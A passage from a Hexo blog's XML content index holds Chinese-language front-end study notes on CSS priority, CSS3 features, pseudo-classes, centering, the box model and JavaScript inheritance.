    </categories>
    
    
    <tags>
      
      <tag>js</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>css优先级</title>
    <link href="/hexo_blog/2021/08/09/css%E9%80%89%E6%8B%A9%E5%99%A8%E5%92%8C%E4%BC%98%E5%85%88%E7%BA%A7/"/>
    <url>/hexo_blog/2021/08/09/css%E9%80%89%E6%8B%A9%E5%99%A8%E5%92%8C%E4%BC%98%E5%85%88%E7%BA%A7/</url>
    
    <content type="html"><![CDATA[<h2 id="css优先级"><a href="#css优先级" class="headerlink" title="css优先级"></a>css优先级</h2><ul><li>优先级就近原则，同权重情况下样式定义最近者为准</li><li>载入样式以最后载入的定位为准</li><li>优先级为: <code>!important &gt; id &gt; class &gt; tag</code>; <code>!important</code> 比 内联优先级高</li></ul>]]></content>
    
    
    <categories>
      
      <category>css</category>
      
    </categories>
    
    
    <tags>
      
      <tag>css</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>css3新特性</title>
    <link href="/hexo_blog/2021/08/06/CSS3%E6%96%B0%E7%89%B9%E6%80%A7/"/>
    <url>/hexo_blog/2021/08/06/CSS3%E6%96%B0%E7%89%B9%E6%80%A7/</url>
    
    <content type="html"><![CDATA[<h1 id="css3新特性"><a href="#css3新特性" class="headerlink" title="css3新特性"></a>css3新特性</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>有了css3，js都可以少写很多</p><h2 id="过渡transi有了css3，js都可以少写很多tion"><a href="#过渡transi有了css3，js都可以少写很多tion" class="headerlink" title="过渡transi有了css3，js都可以少写很多tion"></a>过渡transi有了css3，js都可以少写很多tion</h2><p>transition可以让元素从一种样式逐渐切换到另一种样式</p><p>从左到右的语法：</p><ul><li>css属性/all</li><li>过渡花费的时间</li><li>效果曲线，默认是ease</li><li>延迟时间，默认是0</li></ul><h2 id="动画animation"><a href="#动画animation" class="headerlink" title="动画animation"></a>动画animation</h2><p>从左到右的语法：</p><ul><li>动画名称</li><li>动画持续时间</li><li>运动曲线，默认是ease</li><li>动画延迟，默认0</li><li>动画播放次数，默认是1</li></ul><p>与之相关的css属性是@keyframes，动画帧，它的名字就是动画名称。</p><h2 id="转换transform"><a href="#转换transform" class="headerlink" title="转换transform"></a>转换transform</h2><p>这个属性允许我们旋转，缩放，倾斜或平移给定元素</p><ul><li><p>平移translate<br>transform: translate(x,y)</p></li><li><p>旋转rotate<br>transform: rotate(旋转度数)</p></li><li><p>缩放scale<br>transform: scale(x,y)</p></li><li><p>倾斜skew<br>transform: skew(x, y)</p></li></ul><h2 id="阴影box-shadow"><a href="#阴影box-shadow" class="headerlink" title="阴影box-shadow"></a>阴影box-shadow</h2><p>从左到右的语法</p><ul><li>insert，或者不写</li><li>水平阴影偏移量</li><li>垂直阴影偏移量</li><li>阴影模糊半径，默认0，值越大，模糊面积越大，阴影就越大越淡</li><li>阴影扩散半径，默认为0，取正值时，阴影扩大；取负值时，阴影收缩</li><li>阴影颜色</li></ul><p>box-shadow不需要给出完整数量的值，有如下规则</p><ol><li>只给两个值，那么这两个值就是x和y偏移量的值</li><li>只给三个值，那么在1的基础上，第三个值是阴影模糊半径</li><li>只给四个值，那么在2的基础上，第四个值是阴影扩散半径</li><li>颜色不计数，因为它能够识别颜色的取值。</li></ol><p>如果对同一个元素添加多个阴影效果，需要使用逗号将每个阴影规则分开。</p><h2 id="边框border"><a href="#边框border" class="headerlink" title="边框border"></a>边框border</h2><p>边框可是设置样式，图片，圆角</p><h2 id="渐变"><a href="#渐变" class="headerlink" title="渐变"></a>渐变</h2><p>线性渐变、径向渐变</p><h2 id="滤镜Filter"><a href="#滤镜Filter" class="headerlink" title="滤镜Filter"></a>滤镜Filter</h2><h2 id="媒体查询"><a href="#媒体查询" class="headerlink" title="媒体查询"></a>媒体查询</h2><p>监听屏幕尺寸的变化<br>@media at-rule</p><p>在JS里面，可使用window.matchMedia()根据媒体查询测试窗口，或者使用MediaQueryList.addListener()在查询状态发送变化时收到通知。</p><h2 id="布局"><a href="#布局" class="headerlink" title="布局"></a>布局</h2><h3 id="弹性布局"><a href="#弹性布局" class="headerlink" title="弹性布局"></a>弹性布局</h3><p>display: flex;<br><a href="Flex%E5%B8%83%E5%B1%80.md">跳转</a></p><h3 id="网格布局"><a href="#网格布局" class="headerlink" title="网格布局"></a>网格布局</h3><p>display: grid;</p><h3 id="多列布局"><a href="#多列布局" class="headerlink" title="多列布局"></a>多列布局</h3><p>column-count: <number>;</p><h2 id="背景background"><a href="#背景background" class="headerlink" title="背景background"></a>背景background</h2><h3 id="background-clip"><a href="#background-clip" class="headerlink" title="background-clip"></a>background-clip</h3><p>指定背景绘制的区域，默认值是border-box，即从边框开始绘制。</p><ul><li>padding-box，从padding开始绘制，相当于把border那里的背景去掉了</li><li>content-box，只在内容区绘制</li></ul><h3 id="混合模式background-blend-mode"><a href="#混合模式background-blend-mode" class="headerlink" title="混合模式background-blend-mode"></a>混合模式background-blend-mode</h3><p>允许我们使用多张背景图片，或者图片加背景颜色。</p><h2 id="文字"><a href="#文字" class="headerlink" title="文字"></a>文字</h2><h3 id="换行"><a href="#换行" class="headerlink" title="换行"></a>换行</h3><p>word-break：</p><ul><li>normal 使用浏览器默认的换行规则</li><li>keep-all 只能在半角空格或者连字符处换行</li><li>break-all 允许在单词内换行</li></ul><p>word-wrap：</p><ul><li>normal 默认值</li><li>break-all 对于non-CJK（中文、日文、韩文）文本，可在任意字符间换行</li><li>keep-all 对于CJK文本不换行，Non-CJK文本表现同normal</li></ul><h3 id="省略"><a href="#省略" class="headerlink" title="省略"></a>省略</h3><p>text-overflow</p><ul><li>clip 直接裁剪</li><li>ellipsis 通过…代表被隐藏的文本</li><li>string 只在火狐兼容</li></ul><h3 id="阴影"><a href="#阴影" class="headerlink" title="阴影"></a>阴影</h3><p>text-shadow:水平阴影 垂直阴影 模糊的距离 阴影的颜色。</p><h2 id="颜色"><a href="#颜色" class="headerlink" title="颜色"></a>颜色</h2><ul><li>rgba</li></ul><p>颜色值rgb+透明度a</p><ul><li>hsla</li></ul><p>h色相、s饱和度、l亮度、a透明度。元素使用这个后，透明度只会在该元素有效，不会影响到后代元素。</p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="动画与过渡的区别"><a href="#动画与过渡的区别" class="headerlink" title="动画与过渡的区别"></a>动画与过渡的区别</h3><p>transition需要触发一个事件才会随着时间改变其CSS属性；animation在不需要触发任何事件的情况下，随时间变化来改变元素CSS属性，达到一种动画的效果。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>新增选择器 <code>p:nth-child(n)&#123;color: rgba(255, 0, 0, 0.75)&#125;</code></li><li>弹性盒模型 <code>display: flex;</code></li><li>多列布局 <code>column-count: 5;</code></li><li>媒体查询 <code>@media (max-width: 480px) &#123;.box: &#123;column-count: 1;&#125;&#125;</code></li><li>个性化字体 <code>@font-face&#123;font-family: BorderWeb; src:url(BORDERW0.eot);&#125;</code></li><li>颜色透明度 <code>color: rgba(255, 0, 0, 0.75);</code></li><li>圆角 <code>border-radius: 5px;</code></li><li>渐变 <code>background:linear-gradient(red, green, blue);</code></li><li>阴影 <code>box-shadow:3px 3px 3px rgba(0, 64, 128, 0.3);</code></li><li>倒影 <code>box-reflect: below 2px;</code></li><li>文字装饰 <code>text-stroke-color: red;</code></li><li>文字溢出 <code>text-overflow:ellipsis;</code></li><li>背景效果 <code>background-size: 100px 100px;</code></li><li>边框效果 <code>border-image:url(bt_blue.png) 0 10;</code></li><li>转换<ul><li>旋转 <code>transform: rotate(20deg);</code></li><li>倾斜 <code>transform: skew(150deg, -10deg);</code></li><li>位移 <code>transform: translate(20px, 20px);</code></li><li>缩放 <code>transform: scale(.5);</code></li></ul></li><li>平滑过渡 <code>transition: all .3s ease-in .1s;</code></li><li>动画 <code>@keyframes anim-1 &#123;50% &#123;border-radius: 50%;&#125;&#125; animation: anim-1 1s;</code></li></ul><p><strong>CSS3新增伪类</strong></p><ul><li><code>p:first-of-type</code> 选择属于其父元素的首个<code>&lt;p&gt;</code>元素的每个<code>&lt;p&gt;</code> 元素。</li><li><code>p:last-of-type</code> 选择属于其父元素的最后 <code>&lt;p&gt;</code> 元素的每个<code>&lt;p&gt;</code> 元素。</li><li><code>p:only-of-type</code> 选择属于其父元素唯一的 <code>&lt;p&gt;</code>元素的每个 <code>&lt;p&gt;</code> 元素。</li><li><code>p:only-child</code> 选择属于其父元素的唯一子元素的每个 <code>&lt;p&gt;</code> 元素。</li><li><code>p:nth-child(2)</code> 选择属于其父元素的第二个子元素的每个 <code>&lt;p&gt;</code> 元素。</li><li><code>:after</code> 在元素之前添加内容,也可以用来做清除浮动。</li><li><code>:before</code> 在元素之后添加内容。</li><li><code>:enabled</code> 已启用的表单元素。</li><li><code>:disabled</code> 已禁用的表单元素。</li><li><code>:checked</code> 单选框或复选框被选中。</li></ul>]]></content>
    
    
    <categories>
      
      <category>css</category>
      
    </categories>
    
    
    <tags>
      
      <tag>css</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>伪类</title>
    <link href="/hexo_blog/2021/08/06/%E4%BC%AA%E7%B1%BB%E5%92%8C%E4%BC%AA%E5%85%83%E7%B4%A0/"/>
    <url>/hexo_blog/2021/08/06/%E4%BC%AA%E7%B1%BB%E5%92%8C%E4%BC%AA%E5%85%83%E7%B4%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="伪类"><a href="#伪类" class="headerlink" title="伪类"></a>伪类</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><ul><li>伪元素 – 在内容元素的前后插入额外的元素或样式，但是这些元素实际上并不在文档中生成。</li><li>伪类 – 将特殊的效果添加到特定选择器上。它是已有元素上添加类别的，不会产生新的元素。</li></ul><h2 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h2><ul><li>伪元素 – 在内容元素的前后插入额外的元素或样式，但是这些元素实际上并不在文档中生成。</li><li>它们只在外部显示可见，但不会在文档的源代码中找到它们，因此，称为“伪”元素。例如：</li></ul><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span><span class="hljs-selector-pseudo">::before</span> &#123;<span class="hljs-attribute">content</span>:<span class="hljs-string">&quot;第一章：&quot;</span>;&#125;<span class="hljs-selector-tag">p</span><span class="hljs-selector-pseudo">::after</span> &#123;<span class="hljs-attribute">content</span>:<span class="hljs-string">&quot;Hot!&quot;</span>;&#125;<span class="hljs-selector-tag">p</span><span class="hljs-selector-pseudo">::first-line</span> &#123;<span class="hljs-attribute">background</span>:red;&#125;<span class="hljs-selector-tag">p</span><span class="hljs-selector-pseudo">::first-letter</span> &#123;<span class="hljs-attribute">font-size</span>:<span class="hljs-number">30px</span>;&#125;</code></pre></div><ul><li>伪类 – 将特殊的效果添加到特定选择器上。它是已有元素上添加类别的，不会产生新的元素。例如：</li></ul><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:hover</span> &#123;<span class="hljs-attribute">color</span>: <span class="hljs-number">#FF00FF</span>&#125;<span class="hljs-selector-tag">p</span><span class="hljs-selector-pseudo">:first-child</span> &#123;<span class="hljs-attribute">color</span>: red&#125;</code></pre></div><h2 id="before-和-after-中双冒号和单冒号有什么区别"><a href="#before-和-after-中双冒号和单冒号有什么区别" class="headerlink" title="::before 和 :after 中双冒号和单冒号有什么区别"></a>::before 和 :after 中双冒号和单冒号有什么区别</h2><ul><li>在 CSS 中伪类一直用 <code>:</code> 表示，如 <code>:hover</code>, <code>:active</code> 等</li><li>伪元素在CSS1中已存在，当时语法是用 <code>:</code> 表示，如 <code>:before</code> 和 <code>:after</code></li><li>后来在CSS3中修订，伪元素用 <code>::</code> 表示，如 <code>::before</code> 和 <code>::after</code>，以此区分伪元素和伪类</li><li>由于低版本IE对双冒号不兼容，开发者为了兼容性各浏览器，继续使使用 :after 这种老语法表示伪元素</li><li>综上所述：<code>::before</code> 是 <code>CSS3</code> 中写伪元素的新语法； <code>:after</code> 是 <code>CSS1</code> 中存在的、兼容IE的老语法</li></ul>]]></content>
    
    
    <categories>
      
      <category>css</category>
      
    </categories>
    
    
    <tags>
      
      <tag>css</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>如何画三角形</title>
    <link href="/hexo_blog/2021/08/06/%E5%A6%82%E4%BD%95%E7%94%BB%E4%B8%89%E8%A7%92%E5%BD%A2/"/>
    <url>/hexo_blog/2021/08/06/%E5%A6%82%E4%BD%95%E7%94%BB%E4%B8%89%E8%A7%92%E5%BD%A2/</url>
    
    <content type="html"><![CDATA[<h1 id="如何画三角形"><a href="#如何画三角形" class="headerlink" title="如何画三角形"></a>如何画三角形</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>三角形原理:边框的均分原理</p><h2 id="三角形"><a href="#三角形" class="headerlink" title="三角形"></a>三角形</h2><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">div</span> &#123;  <span class="hljs-attribute">width</span>:<span class="hljs-number">0px</span>;  <span class="hljs-attribute">height</span>:<span class="hljs-number">0px</span>;  <span class="hljs-attribute">border-top</span>:<span class="hljs-number">10px</span> solid red;   <span class="hljs-attribute">border-right</span>:<span class="hljs-number">10px</span> solid transparent;   <span class="hljs-attribute">border-bottom</span>:<span class="hljs-number">10px</span> solid transparent;   <span class="hljs-attribute">border-left</span>:<span class="hljs-number">10px</span> solid transparent;&#125;</code></pre></div><h2 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h2><h3 id="圆？半圆？椭圆？"><a href="#圆？半圆？椭圆？" class="headerlink" title="圆？半圆？椭圆？"></a>圆？半圆？椭圆？</h3><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">div</span> &#123;  <span class="hljs-attribute">width</span>: <span class="hljs-number">100px</span>;  <span class="hljs-attribute">height</span>: <span class="hljs-number">100px</span>;  <span class="hljs-attribute">background-color</span>: red;  <span class="hljs-attribute">margin-top</span>: <span class="hljs-number">20px</span>;&#125;<span class="hljs-selector-class">.box1</span> &#123; <span class="hljs-comment">/* 圆 */</span>  <span class="hljs-comment">/* border-radius: 50%; */</span>  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">50px</span>;&#125;<span class="hljs-selector-class">.box2</span> &#123; <span class="hljs-comment">/* 半圆 */</span>  <span class="hljs-attribute">height</span>: <span class="hljs-number">50px</span>;  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">50px</span> <span class="hljs-number">50px</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>;&#125;<span class="hljs-selector-class">.box3</span> &#123; <span class="hljs-comment">/* 椭圆 */</span>  <span class="hljs-attribute">height</span>: <span class="hljs-number">50px</span>;  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">50px</span>/<span class="hljs-number">25px</span>; <span class="hljs-comment">/* x轴/y轴 */</span>&#125;</code></pre></div><h3 id="画一条-0-5px-的线"><a href="#画一条-0-5px-的线" class="headerlink" title="画一条 0.5px 的线"></a>画一条 0.5px 的线</h3><ul><li><p>采用 meta viewport 的方式</p><p> <code>&lt;meta name=&quot;viewport&quot; content=&quot;initial-scale=1.0, maximum-scale=1.0, user-scalable=no&quot; /&gt;</code></p></li><li><p>采用 <code>border-image</code> 的方式</p></li><li><p>采用 <code>transform: scale()</code> 的方式</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>css</category>
      
    </categories>
    
    
    <tags>
      
      <tag>css</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>居中对齐</title>
    <link href="/hexo_blog/2021/08/06/%E5%B1%85%E4%B8%AD%E5%AF%B9%E9%BD%90%E7%9A%84%E6%96%B9%E5%BC%8F/"/>
    <url>/hexo_blog/2021/08/06/%E5%B1%85%E4%B8%AD%E5%AF%B9%E9%BD%90%E7%9A%84%E6%96%B9%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<h1 id="居中对齐"><a href="#居中对齐" class="headerlink" title="居中对齐"></a>居中对齐</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><h2 id="水平居中"><a href="#水平居中" class="headerlink" title="水平居中"></a>水平居中</h2><blockquote><p><code>inline</code> 元素用<code>text-align: center;</code>即可，如下：</p></blockquote><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-class">.container</span> &#123;   <span class="hljs-attribute">text-align</span>: center;&#125;</code></pre></div><blockquote><p><code>block</code> 元素可使用<code>margin: auto;</code></p></blockquote><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-class">.container</span> &#123;    <span class="hljs-attribute">text-align</span>: center; &#125;<span class="hljs-selector-class">.item</span> &#123;    <span class="hljs-attribute">width</span>: <span class="hljs-number">1000px</span>;    <span class="hljs-attribute">margin</span>: auto; &#125;</code></pre></div><blockquote><p>绝对定位元素可结合<code>left</code>和<code>margin</code>实现，但是必须知道宽度。</p></blockquote><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-class">.container</span> &#123;    <span class="hljs-attribute">position</span>: relative;    <span class="hljs-attribute">width</span>: <span class="hljs-number">500px</span>;&#125;<span class="hljs-selector-class">.item</span> &#123;    <span class="hljs-attribute">width</span>: <span class="hljs-number">300px</span>;    <span class="hljs-attribute">height</span>: <span class="hljs-number">100px</span>;    <span class="hljs-attribute">position</span>: absolute;    <span class="hljs-attribute">left</span>: <span class="hljs-number">50%</span>;    <span class="hljs-attribute">margin</span>: -<span class="hljs-number">150px</span>;&#125;</code></pre></div><h2 id="垂直居中"><a href="#垂直居中" class="headerlink" title="垂直居中"></a><strong>垂直居中</strong></h2><blockquote><p><code>inline</code> 元素可设置<code>line-height</code>的值等于<code>height</code>值，如单行文字垂直居中：</p></blockquote><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-class">.container</span> &#123;   <span class="hljs-attribute">height</span>: <span class="hljs-number">50px</span>;   <span class="hljs-attribute">line-height</span>: <span class="hljs-number">50px</span>;&#125;</code></pre></div><blockquote><p>绝对定位元素，可结合<code>left</code>和<code>margin</code>实现，但是必须知道尺寸。</p></blockquote><ul><li>优点：兼容性好</li><li>缺点：需要提前知道尺寸</li></ul><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-class">.container</span> &#123;    <span class="hljs-attribute">position</span>: relative;    <span class="hljs-attribute">height</span>: <span class="hljs-number">200px</span>;&#125;<span class="hljs-selector-class">.item</span> &#123;    <span class="hljs-attribute">width</span>: <span class="hljs-number">80px</span>;    <span class="hljs-attribute">height</span>: <span class="hljs-number">40px</span>;    <span class="hljs-attribute">position</span>: absolute;    <span class="hljs-attribute">left</span>: <span class="hljs-number">50%</span>;    <span class="hljs-attribute">top</span>: <span class="hljs-number">50%</span>;    <span class="hljs-attribute">margin-top</span>: -<span class="hljs-number">20px</span>;    <span class="hljs-attribute">margin-left</span>: -<span class="hljs-number">40px</span>;&#125;</code></pre></div><blockquote><p>绝对定位可结合<code>transform</code>实现居中。</p></blockquote><ul><li>优点：不需要提前知道尺寸</li><li>缺点：兼容性不好</li></ul><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-class">.container</span> &#123;    <span class="hljs-attribute">position</span>: relative;    <span class="hljs-attribute">height</span>: <span class="hljs-number">200px</span>;&#125;<span class="hljs-selector-class">.item</span> &#123;    <span class="hljs-attribute">width</span>: <span class="hljs-number">80px</span>;    <span class="hljs-attribute">height</span>: <span class="hljs-number">40px</span>;    <span class="hljs-attribute">position</span>: absolute;    <span class="hljs-attribute">left</span>: <span class="hljs-number">50%</span>;    <span class="hljs-attribute">top</span>: <span class="hljs-number">50%</span>;    <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translate</span>(-<span class="hljs-number">50%</span>, -<span class="hljs-number">50%</span>);    <span class="hljs-attribute">background</span>: blue;&#125;</code></pre></div><blockquote><p>绝对定位结合<code>margin: auto</code>，不需要提前知道尺寸，兼容性好。</p></blockquote><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-class">.container</span> &#123;    <span class="hljs-attribute">position</span>: relative;    <span class="hljs-attribute">height</span>: <span class="hljs-number">300px</span>;&#125;<span class="hljs-selector-class">.item</span> &#123;    <span class="hljs-attribute">width</span>: <span class="hljs-number">100px</span>;    <span class="hljs-attribute">height</span>: <span class="hljs-number">50px</span>;    <span class="hljs-attribute">position</span>: absolute;    <span class="hljs-attribute">left</span>: <span class="hljs-number">0</span>;    <span class="hljs-attribute">top</span>: <span class="hljs-number">0</span>;    <span class="hljs-attribute">right</span>: <span class="hljs-number">0</span>;    <span class="hljs-attribute">bottom</span>: <span class="hljs-number">0</span>;    <span class="hljs-attribute">margin</span>: auto;&#125;</code></pre></div><h2 id="水平垂直"><a href="#水平垂直" class="headerlink" title="水平垂直"></a>水平垂直</h2><div class="hljs code-wrapper"><pre><code class="hljs scss"><span class="hljs-comment">// 水平垂直居中一</span><span class="hljs-comment">/*确定容器的宽高宽 500 高 300 的层设置层的外边距 div&#123;*/</span><span class="hljs-attribute">position</span>:absolute;<span class="hljs-comment">/*绝对定位</span><span class="hljs-comment">*/</span><span class="hljs-attribute">width</span>:<span class="hljs-number">500px</span>;<span class="hljs-attribute">height</span>:<span class="hljs-number">300px</span>;<span class="hljs-attribute">top</span>:<span class="hljs-number">50%</span>;<span class="hljs-attribute">left</span>:<span class="hljs-number">50%</span>;<span class="hljs-attribute">margin</span>:-<span class="hljs-number">150px</span>00-<span class="hljs-number">250px</span>;<span class="hljs-comment">/*    外边距为自身宽高的一半*/</span><span class="hljs-attribute">background-color</span>:pink;<span class="hljs-comment">/*方便看效果*/</span>&#125;<span class="hljs-comment">// 水平垂直居中二</span><span class="hljs-comment">/*未知容器的宽高，利用`transform`属性*/</span><span class="hljs-selector-tag">div</span> &#123; <span class="hljs-attribute">position</span>: absolute; <span class="hljs-comment">/*相对定位或绝对定位均可*/</span> <span class="hljs-attribute">width</span>: <span class="hljs-number">500px</span>;<span class="hljs-attribute">height</span>: <span class="hljs-number">300px</span>; <span class="hljs-attribute">top</span>: <span class="hljs-number">50%</span>;<span class="hljs-attribute">left</span>: <span class="hljs-number">50%</span>;<span class="hljs-attribute">transform</span>: translate(-<span class="hljs-number">50%</span>, -<span class="hljs-number">50%</span>); <span class="hljs-attribute">background-color</span>: pink; <span class="hljs-comment">/*方便看效果*/</span>&#125;<span class="hljs-comment">// 水平垂直居中三</span><span class="hljs-comment">/*利用 flex 布局实际使用时应考虑兼容性*/</span><span class="hljs-selector-class">.container</span> &#123; <span class="hljs-attribute">display</span>: flex;<span class="hljs-attribute">align-items</span>: center; <span class="hljs-comment">/*垂直居中*/</span> <span class="hljs-attribute">justify-content</span>: center; <span class="hljs-comment">/*水平居中*/</span>&#125;<span class="hljs-selector-class">.containerdiv</span> &#123; <span class="hljs-attribute">width</span>: <span class="hljs-number">100px</span>; <span class="hljs-attribute">height</span>: <span class="hljs-number">100px</span>;<span class="hljs-attribute">background-color</span>: pink; <span class="hljs-comment">/*方便看效果*/</span>&#125;<span class="hljs-comment">// 水平垂直居中四</span><span class="hljs-comment">/*利用 text-align:center 和 vertical-align:middle 属性*/</span><span class="hljs-selector-class">.container</span> &#123; <span class="hljs-attribute">position</span>: fixed; <span class="hljs-attribute">top</span>: <span class="hljs-number">0</span>;<span class="hljs-attribute">right</span>: <span class="hljs-number">0</span>;<span class="hljs-attribute">bottom</span>: <span class="hljs-number">0</span>;<span class="hljs-attribute">left</span>: <span class="hljs-number">0</span>;<span class="hljs-attribute">background</span>: rgba(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0.5</span>); <span class="hljs-attribute">text-align</span>: center;<span class="hljs-attribute">font-size</span>: <span class="hljs-number">0</span>;<span class="hljs-attribute">white-space</span>: nowrap; <span class="hljs-attribute">overflow</span>: auto;&#125;<span class="hljs-selector-class">.container</span><span class="hljs-selector-pseudo">::after</span> &#123; <span class="hljs-attribute">content</span>: <span class="hljs-string">&quot;&quot;</span>;<span class="hljs-attribute">display</span>: inline-block; <span class="hljs-attribute">height</span>: <span class="hljs-number">100%</span>;<span class="hljs-attribute">vertical-align</span>: middle;&#125;<span class="hljs-selector-class">.box</span> &#123;<span class="hljs-attribute">display</span>: inline-block; <span class="hljs-attribute">width</span>: <span class="hljs-number">500px</span>; <span class="hljs-attribute">height</span>: <span class="hljs-number">400px</span>;<span class="hljs-attribute">background-color</span>: pink; <span class="hljs-attribute">white-space</span>: normal; <span class="hljs-attribute">vertical-align</span>: middle;&#125;</code></pre></div><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>一般常见的几种居中的方法有： 对于宽高固定的元素<br>（1）我们可以利用 margin:0auto 来实现元素的水平居中。</p><p>（2）利用绝对定位，设置四个方向的值都为 0，并将 margin 设置为 auto，由于宽高固定， 因此对应方向实现平分，可以实现水平和垂直方向上的居中。</p><p>（3）利用绝对定位，先将元素的左上角通过 top:50%和 left:50%定位到页面的中心，然后再通过 margin 负值来调整元素的中心点到页面的中心。</p><p>（4）利用绝对定位，先将元素的左上角通过 top:50%和 left:50%定位到页面的中心，然后再通过 translate 来调整元素的中心点到页面的中心。</p><p>（5）使用 flex 布局，通过 align-items:center 和 justify-content:center 设置容器的垂直和水平方向上为居中对<br>齐，然后它的子元素也可以实现垂直和水平的居中。对于宽高不定的元素，上面的后面两种方法，可以实现元素的垂直和水平的居中。</p>]]></content>
    
    
    <categories>
      
      <category>css</category>
      
    </categories>
    
    
    <tags>
      
      <tag>css</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>块级元素与行内元素</title>
    <link href="/hexo_blog/2021/08/06/%E7%9B%92%E5%AD%90%E6%A8%A1%E5%9E%8B/"/>
    <url>/hexo_blog/2021/08/06/%E7%9B%92%E5%AD%90%E6%A8%A1%E5%9E%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="盒子模型"><a href="#盒子模型" class="headerlink" title="盒子模型"></a>盒子模型</h1><h2 id="前言-label"><a href="#前言-label" class="headerlink" title="前言:label:"></a>前言:label:</h2><p>当对一个文档进行布局的时候，浏览器的渲染引擎会根据标准之一的 <strong>CSS 基础框盒模型</strong>（将所有元素表示为一个个矩形的盒子CSS 决定这些盒子的大小、位置以及属性</p><p>盒子模型构成：内容(<code>content</code>)、内填充(<code>padding</code>)、 边框(<code>border</code>)、外边距(<code>margin</code>)</p><p><img src="C:/Users/l%27x/AppData/Roaming/Typora/typora-user-images/image-20211010144547591.png" alt="image-20211010144547591"></p><h2 id="标准模型"><a href="#标准模型" class="headerlink" title="标准模型"></a>标准模型</h2><p>属性width,height只包含内容content，不包含border和padding。</p><p>元素宽度 = <code>width + padding + border + margin</code></p><h2 id="IE模型"><a href="#IE模型" class="headerlink" title="IE模型"></a>IE模型</h2><p><code>IE8</code>及其以下版本浏览器，未声明 <code>DOCTYPE</code>，内容宽高会包含内填充和边框，称为怪异盒模型(<code>IE</code>盒模型)</p><p>属性width,height包含border和padding，指的是content+padding+border。</p><p>元素宽度 = <code>width + margin</code></p><h2 id="注意-atom-symbol"><a href="#注意-atom-symbol" class="headerlink" title="注意:atom_symbol:"></a>注意:atom_symbol:</h2><p>标准浏览器通过设置 css3 的 <code>box-sizing: border-box</code> 属性，触发“怪异模式”解析计算宽高</p>]]></content>
    
    
    <categories>
      
      <category>css</category>
      
    </categories>
    
    
    <tags>
      
      <tag>css</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>继承</title>
    <link href="/hexo_blog/2021/08/06/%E7%BB%A7%E6%89%BF/"/>
    <url>/hexo_blog/2021/08/06/%E7%BB%A7%E6%89%BF/</url>
    
    <content type="html"><![CDATA[<h1 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>许多面向对象语言都支持两种继承方式：接口继承和实现继承。接口继承只继承方法和签名，而实现继承则继承实际的方法。由于在 JavaScript 中函数没有签名，因此无法实现接口继承，只支持实现继承。</p><h2 id="js继承"><a href="#js继承" class="headerlink" title="js继承"></a>js继承</h2><p>我了解的 js 中实现继承的几种方式有：</p><p>（1）第一种是以原型链的方式来实现继承，但是这种实现方式存在的缺点是，在包含有引用类型的数据时，会被所有的实例对象所共享，容易造成修改的混乱。还有就是在创建子类型的时候不能向超类型传递参数。</p><p>​    –基于以上问题，在实践中很少会单独使用原型链。</p><p>（2）第二种方式是使用借用构造函数的方式，这种方式是通过在子类型的函数中调用超类型的构造函数来实现的，这一种方法解决了不能向超类型传递参数的缺点，但是它存在的一个问题就是无法实现函数方法的复用，并且超类型原型定义的方法子类型也没有办法访问到。</p><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">SuperType</span>(<span class="hljs-params"></span>)</span>&#123;    <span class="hljs-built_in">this</span>.colors = [<span class="hljs-string">&quot;red&quot;</span>, <span class="hljs-string">&quot;blue&quot;</span>, <span class="hljs-string">&quot;green&quot;</span>];&#125;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">SubType</span>(<span class="hljs-params"></span>)</span>&#123;    <span class="hljs-comment">//继承了 SuperType</span>    SuperType.call(<span class="hljs-built_in">this</span>);&#125;<span class="hljs-keyword">var</span> instance1 = <span class="hljs-keyword">new</span> SubType();instance1.colors.push(<span class="hljs-string">&quot;black&quot;</span>);<span class="hljs-built_in">console</span>.log(instance1.colors);  <span class="hljs-comment">//&quot;red,blue,green,black&quot;</span><span class="hljs-keyword">var</span> instance2 = <span 